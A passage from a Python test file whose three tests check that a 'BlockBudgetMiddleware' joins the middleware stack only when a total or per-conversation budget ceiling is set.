            mock_settings.MIDDLEWARE_ENABLED = True
            return [type(m).__name__ for m in build_middleware_list(resolved)]

    def test_nothing_is_added_without_a_ceiling(self):
        assert "BlockBudgetMiddleware" not in self._built(0)

    def test_a_conversation_ceiling_alone_puts_it_in_the_stack(self):
        assert "BlockBudgetMiddleware" in self._built(0, per_thread=50)

    def test_setting_one_puts_it_in_the_stack(self):
        assert "BlockBudgetMiddleware" in self._built(10)
